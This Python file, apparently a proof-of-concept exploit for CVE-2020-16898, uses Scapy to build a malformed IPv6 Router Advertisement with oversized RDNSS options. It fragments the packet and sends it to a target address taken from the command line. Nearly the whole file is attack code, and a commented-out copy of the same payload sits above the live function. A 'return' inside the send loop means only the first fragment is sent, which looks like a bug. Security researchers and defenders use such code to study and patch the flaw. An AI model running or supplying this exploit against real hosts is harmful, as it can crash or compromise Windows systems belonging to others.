#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
#Author: unknow
#Rewrite by afei

from scapy.all import *
from scapy.layers.inet6 import ICMPv6NDOptEFA, ICMPv6NDOptRDNSS, ICMPv6ND_RA, IPv6, IPv6ExtHdrFragment, fragment6
import sys

'''
ipv6_dst = ""  #目标主机ipv6地址
ipv6_src = ""   #本机ipv6地址

pack_test_half = 'A'.encode()*8 + b"\x18\x30" + b"\xFF\x18"
pack_test = pack_test_half + 'A'.encode()*4

c = ICMPv6NDOptEFA()

e = ICMPv6NDOptRDNSS()
e.len = 21
e.dns = [
"AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA" ]
a = ICMPv6NDOptRDNSS()
a.len = 8
pkt = ICMPv6ND_RA() / a / \
    Raw(load="A".encode()*32 + pack_test_half + b"\x18\xa0"*6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e

p_test_frag = IPv6(dst=ipv6_dst, src=ipv6_src, hlim=255)/ \
              IPv6ExtHdrFragment()/pkt
 
l=fragment6(p_test_frag, 200)

for p in l:
    send(p)
'''

def ipv6_dns_attack():
    if(len(sys.argv) < 3):
        print("-----------------------------------------------")
        print(" ")
        print("Useg: python %s <ipv6_dst> <ipv6_src>" % sys.argv[0])
        print("eg: python cve-2020-16898_exp.py cf10::ff0::::00 ed20::00::::ff" )
        print(" ")
        print("-----------------------------------------------")
        return
        
    ipv6_dst = sys.argv[1]
    ipv6_src = sys.argv[2]
    pack_test_half = 'A'.encode()*8 + b"\x18\x30" + b"\xFF\x18"
    pack_test = pack_test_half + 'A'.encode()*4

    c = ICMPv6NDOptEFA()

    e = ICMPv6NDOptRDNSS()
    e.len = 21
    e.dns = [
    "AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
    "AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA" ]
    a = ICMPv6NDOptRDNSS()
    a.len = 8
    pkt = ICMPv6ND_RA() / a / \
        Raw(load="A".encode()*32 + pack_test_half + b"\x18\xa0"*6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e

    p_test_frag = IPv6(dst=ipv6_dst, src=ipv6_src, hlim=255)/ \
                  IPv6ExtHdrFragment()/pkt
     
    l=fragment6(p_test_frag, 200)

    for p in l:
        send(p)
        return

if (__name__ == '__main__'):
    ipv6_dns_attack()